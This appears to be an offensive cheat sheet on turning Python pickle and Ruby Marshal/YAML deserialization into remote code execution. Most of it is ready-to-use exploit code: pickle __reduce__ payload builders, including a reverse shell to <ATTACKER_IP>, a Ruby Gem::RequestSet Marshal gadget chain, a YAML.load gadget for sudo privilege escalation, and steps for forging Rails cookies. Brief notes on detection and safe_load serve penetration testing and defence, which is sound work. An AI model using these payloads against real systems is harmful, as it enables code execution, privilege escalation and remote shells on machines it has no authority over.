# Python Pickle + Ruby Marshal/YAML Deserialization

## When this applies

- App calls `pickle.loads()` / `pickle.load()` on user data (Python).
- App calls `Marshal.load()` / `YAML.load()` on user data (Ruby).
- Goal: instantiate a malicious object whose construction triggers RCE.

## Technique

Both languages allow deserialization to invoke arbitrary callable. Python: define `__reduce__` returning `(os.system, ('cmd',))`. Ruby: build a Marshal-encoded Gem::RequestSet → Kernel#load gadget chain, OR use a YAML.load gadget (Net::WriteAdapter chain).

## Steps

### Python — pickle format

```
Protocol 0: Text-based (legacy)
Protocol 1: Binary (old)
Protocol 2: Binary (Python 2.3+)
Protocol 3: Binary (Python 3.0+) - gAN
Protocol 4: Binary (Python 3.4+) - gAR
Protocol 5: Binary (Python 3.8+)
```

### Python — detection

```bash
# Check magic bytes
echo "gANjcG..." | base64 -d | xxd | head
# Output: 80 03 = Protocol 3

# Protocol 4
echo "gARjcG..." | base64 -d | xxd | head
# Output: 80 04 = Protocol 4
```

### Python — basic RCE

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm /tmp/file',))

payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

### Python — subprocess RCE

```python
import pickle
import base64
import subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.Popen, (('rm', '/tmp/file'),))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

### Python — reverse shell

```python
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import socket, subprocess, os
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("<ATTACKER_IP>", 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        return (subprocess.call, (["/bin/sh", "-i"],))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

### Ruby — Marshal format

```
Header: 04 08  (version 4.8)

Common prefixes (Base64):
BAh - Most common
BAFF - Also common
BAFB - Alternative
```

### Ruby — detection

```bash
# Check magic bytes
echo "BAhvOh..." | base64 -d | xxd | head
# Output: 0408 = Ruby Marshal

# Identify Rails
# Look for cookies like: _session_id, _csrf_token
```

### Ruby — universal Marshal gadget chain (2.x-3.x)

```ruby
#!/usr/bin/env ruby
require 'base64'

# Create malicious gem specification
stub_spec = Gem::StubSpecification.new
stub_spec.instance_variable_set(:@loaded_from, "|rm /tmp/file")

# Create installer set
installer_set = Gem::Resolver::InstallerSet.new(:both)
installer_set.instance_variable_set(:@always_install, [stub_spec])

# Create request set (entry point)
request_set = Gem::RequestSet.new
request_set.instance_variable_set(:@sets, [installer_set])

# Serialize and encode
payload = Marshal.dump(request_set)
encoded = Base64.strict_encode64(payload)

puts encoded
```

### Ruby — gadget chain components

```ruby
Marshal.load(payload)
  → Gem::RequestSet#install
    → Gem::Resolver::InstallerSet#install
      → Gem::StubSpecification#full_name
        → Kernel#load("|command")  # Pipe triggers system execution
```

### Ruby — YAML.load() deserialization (privilege escalation)

`YAML.load()` (vs safe `YAML.safe_load()`) allows arbitrary Ruby object instantiation. Common privesc vector: sudo Ruby scripts that parse YAML from CWD.

**Gadget chain** (Gem::Requirement → Gem::RequestSet → Kernel#system):
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
    requirements:
      !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: &1 !ruby/object:Gem::Package::TarReader::Entry
           read: 0
           header: "abc"
        debug_output: &1 !ruby/object:Net::WriteAdapter
           socket: &1 !ruby/object:Gem::RequestSet
               sets: !ruby/object:Net::WriteAdapter
                   socket: !ruby/module "Kernel"
                   method_id: :system
               git_set: COMMAND_HERE
           method_id: :resolve
```

**Exploitation**: Write malicious YAML as `dependencies.yml` (or whatever filename the script reads) in a writable directory, `cd` there, then run the sudo script. Replace `COMMAND_HERE` with target command.

**Detection**: `grep -r "YAML.load" /opt /usr/local --include="*.rb"` — any Ruby script using `YAML.load()` on user-controllable input is vulnerable.

### Ruby — dangerous methods

```ruby
# Code execution
eval(code)
instance_eval(code)
class_eval(code)
module_eval(code)

# Command execution
system(cmd)
exec(cmd)
`cmd`  # Backticks
%x(cmd)
open("|cmd")
IO.popen(cmd)
Kernel.load("|cmd")  # With pipe prefix

# Deserialization
Marshal.load(data)
Marshal.restore(data)
YAML.load(data)
```

### Rails-specific exploits

If you have the secret_key_base, you can:
1. Decrypt the cookie
2. Deserialize it
3. Modify the object
4. Re-serialize, re-encrypt, sign

Rails uses:
```ruby
ActiveSupport::MessageEncryptor
ActiveSupport::MessageVerifier
```

## Verifying success

- Python: target executes `os.system('rm /tmp/file')` — file is gone.
- Ruby: Kernel#load with `|cmd` triggers shell execution — out-of-band callback.
- YAML.load gadget triggers Kernel#system call.

## Common pitfalls

- Ruby gadget chain class names depend on Ruby/Gem version — Ruby 2.x ↔ 3.x gadgets differ.
- `YAML.safe_load` is NOT vulnerable — confirm the call site uses `YAML.load`.
- Modern Python (3.8+) `pickle` is the same — no built-in protection. Hardening requires custom unpicklers.

## Tools

- Custom Python script (build pickle payload)
- Custom Ruby script (build Marshal payload)
- Burp Suite Repeater (deliver payloads)
